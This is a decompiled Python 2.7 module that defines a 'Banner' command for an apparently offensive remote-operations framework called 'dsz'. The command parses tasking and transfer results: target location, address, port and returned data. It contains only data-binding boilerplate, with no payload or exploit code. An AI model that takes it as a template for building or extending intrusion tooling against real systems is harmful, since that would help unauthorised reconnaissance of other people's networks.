# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz
import dsz.cmd
import dsz.data
import dsz.lp

class Banner(dsz.data.Task):

    def __init__(self, cmd=None):
        dsz.data.Task.__init__(self, cmd)

    def _LoadData(self):
        try:
            self.TaskingInfo = Banner.TaskingInfo(dsz.cmd.data.Get('TaskingInfo', dsz.TYPE_OBJECT)[0])
        except:
            self.TaskingInfo = None

        try:
            self.Transfer = Banner.Transfer(dsz.cmd.data.Get('Transfer', dsz.TYPE_OBJECT)[0])
        except:
            self.Transfer = None

        return

    class TaskingInfo(dsz.data.DataBean):

        def __init__(self, obj):
            try:
                self.recursive = dsz.cmd.data.ObjectGet(obj, 'recursive', dsz.TYPE_BOOL)[0]
            except:
                self.recursive = None

            try:
                self.TaskType = Banner.TaskingInfo.TaskType(dsz.cmd.data.ObjectGet(obj, 'TaskType', dsz.TYPE_OBJECT)[0])
            except:
                self.TaskType = None

            try:
                self.SearchMask = Banner.TaskingInfo.SearchMask(dsz.cmd.data.ObjectGet(obj, 'SearchMask', dsz.TYPE_OBJECT)[0])
            except:
                self.SearchMask = None

            try:
                self.Target = Banner.TaskingInfo.Target(dsz.cmd.data.ObjectGet(obj, 'Target', dsz.TYPE_OBJECT)[0])
            except:
                self.Target = None

            return

        class TaskType(dsz.data.DataBean):

            def __init__(self, obj):
                try:
                    self.value = dsz.cmd.data.ObjectGet(obj, 'value', dsz.TYPE_STRING)[0]
                except:
                    self.value = None

                return

        class SearchMask(dsz.data.DataBean):

            def __init__(self, obj):
                try:
                    self.value = dsz.cmd.data.ObjectGet(obj, 'value', dsz.TYPE_STRING)[0]
                except:
                    self.value = None

                return

        class Target(dsz.data.DataBean):

            def __init__(self, obj):
                try:
                    self.local = dsz.cmd.data.ObjectGet(obj, 'local', dsz.TYPE_BOOL)[0]
                except:
                    self.local = None

                try:
                    self.location = dsz.cmd.data.ObjectGet(obj, 'location', dsz.TYPE_STRING)[0]
                except:
                    self.location = None

                return

    class Transfer(dsz.data.DataBean):

        def __init__(self, obj):
            try:
                self.text = dsz.cmd.data.ObjectGet(obj, 'text', dsz.TYPE_STRING)[0]
            except:
                self.text = None

            try:
                self.data = dsz.cmd.data.ObjectGet(obj, 'data', dsz.TYPE_STRING)[0]
            except:
                self.data = None

            try:
                self.address = dsz.cmd.data.ObjectGet(obj, 'address', dsz.TYPE_STRING)[0]
            except:
                self.address = None

            try:
                self.data_size = dsz.cmd.data.ObjectGet(obj, 'data_size', dsz.TYPE_INT)[0]
            except:
                self.data_size = None

            try:
                self.port = dsz.cmd.data.ObjectGet(obj, 'port', dsz.TYPE_INT)[0]
            except:
                self.port = None

            return


dsz.data.RegisterCommand('Banner', Banner)
BANNER = Banner
banner = Banner